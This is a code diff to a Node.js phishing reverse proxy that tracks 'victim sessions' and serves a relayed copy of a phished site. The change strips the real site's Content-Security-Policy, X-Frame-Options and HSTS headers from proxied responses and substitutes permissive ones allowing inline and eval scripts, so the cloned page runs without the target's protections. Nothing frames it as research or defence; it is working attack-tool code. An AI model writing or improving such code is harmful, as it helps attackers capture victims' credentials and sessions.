@@ -60,7 +60,13 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
             VICTIM_SESSIONS[session].port = phishedURL.port;
             VICTIM_SESSIONS[session].host = phishedURL.host;
 
-            clientResponse.writeHead(200, { "Content-Type": "text/html" });
+            clientResponse.writeHead(200, { 
+                "Content-Type": "text/html",
+                "Content-Security-Policy": "default-src 'self' 'unsafe-inline' 'unsafe-eval' data: blob:; script-src 'self' 'unsafe-inline' 'unsafe-eval' https:; style-src 'self' 'unsafe-inline' https:; img-src 'self' data: https:; connect-src 'self' https:; font-src 'self' https:; object-src 'none'; base-uri 'self'; form-action 'self'",
+                "X-Frame-Options": "SAMEORIGIN",
+                "X-Content-Type-Options": "nosniff",
+                "Referrer-Policy": "strict-origin-when-cross-origin"
+            });
             fs.createReadStream(PROXY_FILES.index).pipe(clientResponse);
         }
         catch (error) {
@@ -356,7 +362,18 @@ const makeProxyRequest = (proxyRequestProtocol, proxyRequestOptions, currentSess
                     }
                 }
 
-                clientResponse.writeHead(proxyResponse.statusCode, proxyResponse.headers);
+                // Remove problematic headers that cause CSP violations
+                const cleanHeaders = { ...proxyResponse.headers };
+                delete cleanHeaders['content-security-policy'];
+                delete cleanHeaders['x-frame-options'];
+                delete cleanHeaders['strict-transport-security'];
+                
+                // Add our own security headers
+                cleanHeaders['Content-Security-Policy'] = "default-src 'self' 'unsafe-inline' 'unsafe-eval' data: blob: https:; script-src 'self' 'unsafe-inline' 'unsafe-eval' https:; style-src 'self' 'unsafe-inline' https:; img-src 'self' data: https:; connect-src 'self' https:; font-src 'self' https:; object-src 'none'; base-uri 'self'; form-action 'self'";
+                cleanHeaders['X-Frame-Options'] = "SAMEORIGIN";
+                cleanHeaders['X-Content-Type-Options'] = "nosniff";
+                
+                clientResponse.writeHead(proxyResponse.statusCode, cleanHeaders);
                 clientResponse.end(serverResponseBody);
             });
     });
